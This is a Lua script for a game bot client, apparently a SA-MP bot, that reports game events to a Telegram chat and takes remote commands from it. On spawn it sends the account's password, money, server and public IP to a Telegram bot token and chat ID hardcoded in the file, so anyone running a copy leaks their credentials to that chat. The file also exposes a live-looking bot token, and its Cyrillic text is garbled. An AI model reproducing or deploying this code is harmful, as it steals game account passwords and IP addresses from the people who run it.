local token = ('2131432063:AAG6hXyepOM7Gryc8PvD87_eZmFrnoBqSK8')
local chatid = ('612687438')
local link = ('https://api.telegram.org/bot' .. token .. '/sendMessage?chat_id=' .. chatid .. '&text=' )
--local KDtext = 45000

local ansi_decode={ -- ���� ��������
	 [128]='\208\130',[129]='\208\131',[130]='\226\128\154',[131]='\209\147',[132]='\226\128\158',[133]='\226\128\166',
	 [134]='\226\128\160',[135]='\226\128\161',[136]='\226\130\172',[137]='\226\128\176',[138]='\208\137',[139]='\226\128\185',
	 [140]='\208\138',[141]='\208\140',[142]='\208\139',[143]='\208\143',[144]='\209\146',[145]='\226\128\152',
	 [146]='\226\128\153',[147]='\226\128\156',[148]='\226\128\157',[149]='\226\128\162',[150]='\226\128\147',[151]='\226\128\148',
	 [152]='\194\152',[153]='\226\132\162',[154]='\209\153',[155]='\226\128\186',[156]='\209\154',[157]='\209\156',
	 [158]='\209\155',[159]='\209\159',[160]='\194\160',[161]='\209\142',[162]='\209\158',[163]='\208\136',
	 [164]='\194\164',[165]='\210\144',[166]='\194\166',[167]='\194\167',[168]='\208\129',[169]='\194\169',
	 [170]='\208\132',[171]='\194\171',[172]='\194\172',[173]='\194\173',[174]='\194\174',[175]='\208\135',
	 [176]='\194\176',[177]='\194\177',[178]='\208\134',[179]='\209\150',[180]='\210\145',[181]='\194\181',
	 [182]='\194\182',[183]='\194\183',[184]='\209\145',[185]='\226\132\150',[186]='\209\148',[187]='\194\187',
	 [188]='\209\152',[189]='\208\133',[190]='\209\149',[191]='\209\151'
}

function AnsiToUtf8(s)
	 local r, b = ''
	 for i = 1, s and s:len() or 0 do
	   b = s:byte(i)
	   if b < 128 then
	     r = r..string.char(b)
	   else
      if b > 239 then
	       r = r..'\209'..string.char(b - 112)
	     elseif b > 191 then
	       r = r..'\208'..string.char(b - 48)
	     elseif ansi_decode[b] then
	       r = r..ansi_decode[b]
	     else
	       r = r..'_'
	     end
	   end
	 end
  return r
end

function getIp() -- �������� ���� ����
	ip = openUrl('https://api.ipify.org/?format=json')

	return ip:match('{\"ip\":\"(.*)\"}')
end

function updateThread(token)
    local bot, ext = require("lua-bot-api").configure(token)

    ext.onTextReceive = function(msg)
        linda:send("tg_message_recv", { from = msg.from.id, text = msg.text })
    end

    ext.run()
end

function onScriptUpdate()
    local eventName, eventData = linda:receive(0, "tg_message_recv")
    if eventName == "tg_message_recv" then
        onTelegramMessage(eventData.from, eventData.text)
    end
end

function onScriptStart()
	math.randomseed(os.time())
  lanes.gen("*", updateThread)(token)
	printLog('[by _delete_]: ������ ������� ��������!')
	openUrl(AnsiToUtf8(link..'[by _delete_] ������ ������� ��������'))
end

function isCoordsInArea2d(x, y, ax, ay, bx, by)
	if x > ax and x < bx and y < ay and y > by then
		return true
	end
	return false
end

function onSetHealth(health)
	nickname = getNickName()
	sn = getServerName()
	openUrl(AnsiToUtf8(link..'[by _delete_] ��������� ��������:%0A%0A���: '..nickname..'%0A��������: '..health..'%0A������: '..sn))
end

function onConnect()
	nickname = getNickName()
	sn = getServerName()
	openUrl(AnsiToUtf8(link..'[by _delete_] ��� '..nickname..' ������� ��������� � �������: '..sn))
end

function isPlayerInStream(playerName)
    for i = 0, 999 do
        local player = getPlayer(i)
        if player then
            if player.inStream and player.name == playerName then
                return true
            end
        end
    end
    return false
end

function onServerMessage(msg)
    local adminName, playerName = msg:match('�������������: (%S+) ������� (%S+)')
    if adminName and playerName then
        local botName = getNickName()
        if playerName ~= botName then
            if isPlayerInStream(playerName) then
				openUrl(AnsiToUtf8(link..'��� '..nick..'['..id..'] ���� � ���������.%0A�������: ����� ������� � ���� ����������.')) -- %0A ������� �� ����� ������
                reconnect(10000)
            end
        end
    end
end

function onSpawned(x)
	erp = getServerName()
	nick = getNickName()
	pass = getPassword()
	id = getBotId()
	money = getMoney()
	if (x > 1 and x < 3000) then
		printLog('[Evolve Evolution]: ��� ���������!')
		defCallAdd(2000, false, function()
			openUrl(AnsiToUtf8(link..'��� '..nick..'['..id..'] ����������� �� �������.%0A������: '..pass..'%0A����� �� �����: '..money..'$%0A������: '..erp..'%0AIP ����: '..getIp())) -- %0A ������� �� ����� ������
		end)
	end
end


function onPrintLog(str)
	erp = getServerName()
	nick = getNickName()
	pass = getPassword()
	money = getMoney()
	id = getBotId()
	if str:find('���������� � �������� ���������') then
		openUrl(AnsiToUtf8(link..'- ���������� � �������� ���������!%0A%0A���: ' ..nick.. '['..id..']%0A������: '..erp)) -- ��� / ���������
	end
	if str:find('����� warn '..nick) then
		openUrl(AnsiToUtf8(link..'- ��� ��� ������������.%0A%0A���: '..nick..'%0A������:'..erp)) -- ����
	end
	if str:find('������� '..nick) then
		openUrl(AnsiToUtf8(link..'- ��� ��� ������������.%0A%0A���: '..nick..'%0A������:'..erp)) -- ���
	end
	if str:find('��� �������������� � ���� �������������') then
		openUrl(AnsiToUtf8(link .. '- ������������� �������������� ���!%0A%0A���: ' ..nick..'['.. id ..']%0A������: '..erp)) -- �������������� ����� � ����
	end
	if str:find(' ��� ���������') then
		openUrl(AnsiToUtf8(link .. '- ������������� ��� ��� ���������!%0A%0A���: ' ..nick.. '['..id..']%0A������: '..erp)) -- ��� ��������� �����
	end
	if str:find('�������� ���������') then
		openUrl(AnsiToUtf8(link .. '- �����������! �� �������� �������� ���������! ������ ��������� ������� ����!%0A%0A���: ' ..nick.. '['..id..']%0A������: '..erp)) -- ������ �������
		reconnect(10000)
	end
	if str:find('���') then
	--	defCallAdd(KDtext, true, function()
	--		sendInput('�� � �� ������ ������ ��� ��� ����') --
	--	end)
		openUrl(AnsiToUtf8(link .. '- ������������� ��� ������� �� ���?%0A%0A���: ' ..nick.. '['..id..']%0A������: '..erp)) -- �������� ������ �� "�� ���?"
	end
	if str:find('1 EVENT XP') then
		openUrl(AnsiToUtf8(link .. '- �����������! �� �������� 1 EVENT XP!%0A%0A���: ' ..nick.. '['..id..']%0A������: '..erp)) -- 
	end
end

function onTelegramMessage(from, text)
	sn = getServerName()
	nickname = getNickName()
	money = getMoney()
    if text == "/active" then
        openUrl(AnsiToUtf8(link..'[by _delete_] �������� ���:%0A%0A���: '..nickname..'%0A������: '..sn))
			elseif text == "/t" then
        openUrl(AnsiToUtf8(link..'[by _delete_] ��������� ������� ���� ����������'))
				runCommand('��, � ���')
			elseif text == "/money" then
				openUrl(AnsiToUtf8(link..'[by _delete_] ���: '..nickname..'%0A�����: '..money))
			elseif text == "/aq" then
				openUrl(AnsiToUtf8(link..'[by _delete_] ��� ���� ���������'))
				runCommand('!quit')
			elseif text == "/cmd" then
				openUrl(AnsiToUtf8(link..'[by _delete_] �������:%0A/active - ���������� ������ �������� �����%0A/t - �������� ��������� � ��� "��, � ���"%0A/money - ������ ���������� ����� � �����%0A/aq - ��������� ���� �����'))
    else
        openUrl(AnsiToUtf8(link..'[by _delete_] ����������� �������%0A�������: /cmd ��� �� ���������� �������'))
    end
end
--function onScriptUpdate()
--    if os.date("%M:%S") == "20:00" then 
--    end
--end